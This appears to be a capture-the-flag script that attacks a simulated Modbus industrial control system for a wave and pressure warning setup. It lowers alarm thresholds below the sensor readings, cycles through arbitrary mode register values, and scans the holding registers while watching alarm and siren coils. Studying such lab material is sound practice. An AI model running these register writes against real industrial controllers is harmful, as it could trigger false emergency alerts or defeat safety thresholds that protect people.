from pymodbus.client import ModbusTcpClient
import time
import struct

client = ModbusTcpClient("labs.ctfzone.com", port=8663)
client.connect()

# The system:
# Input Registers (sensors): [wave_height=847, something=23, pressure=1012, something=15]
# Holding Registers (config): [mode=0, threshold1=300, threshold2=900, ...]
# Coils (status): [?, alarm?, broadcast?, siren?, ?]

# Theory: If we manipulate thresholds to be below sensor values, 
# the system escalates to emergency and reveals the flag

# Let's try writing thresholds lower than sensor readings
print("=== Strategy: Lower thresholds below sensor readings ===")
print(f"Sensor readings: wave=847, pressure=1012")

# Write threshold1 below wave (847)
r = client.write_register(address=1, value=100)  # HR[1] threshold1
coils = client.read_coils(address=0, count=100)
holding = client.read_holding_registers(address=0, count=20)
input_r = client.read_input_registers(address=0, count=20)
if hasattr(coils, 'bits'):
    print(f"After HR[1]=100: Holding[0:5]={holding.registers[:5]}, True coils: {[i for i,v in enumerate(coils.bits) if v]}, Inputs[0:5]={input_r.registers[:5]}")
time.sleep(2)

# Also write threshold2 below pressure (1012)
r = client.write_register(address=2, value=100)  # HR[2] threshold2
coils = client.read_coils(address=0, count=100)
holding = client.read_holding_registers(address=0, count=20)
if hasattr(coils, 'bits'):
    print(f"After HR[2]=100: Holding[0:5]={holding.registers[:5]}, True coils: {[i for i,v in enumerate(coils.bits) if v]}")
time.sleep(2)

# Try writing mode register
for mode_val in [1, 2, 3, 99, 255, 1337, 0x4141, 0x1337]:
    r = client.write_register(address=0, value=mode_val)
    time.sleep(1)
    holding = client.read_holding_registers(address=0, count=10)
    coils = client.read_coils(address=0, count=50)
    input_r = client.read_input_registers(address=0, count=10)
    if hasattr(coils, 'bits'):
        true_c = [i for i,v in enumerate(coils.bits) if v]
        if 6 in true_c or 7 in true_c or 8 in true_c or len(true_c) > 5:
            print(f"Mode={mode_val}: Coils: {true_c}, Holding: {holding.registers[:5]}, Input: {input_r.registers[:5]}")
    time.sleep(1)

# Read holding registers 0-500
print("\n=== Full Holding Register scan 0-500 ===")
for addr in range(0, 500, 20):
    holding = client.read_holding_registers(address=addr, count=20)
    if hasattr(holding, 'registers'):
        nonz = [f"{addr+i}={v}" for i,v in enumerate(holding.registers) if v != 0]
        if nonz:
            print(f"  HR {addr}: {', '.join(nonz)}")

client.close()
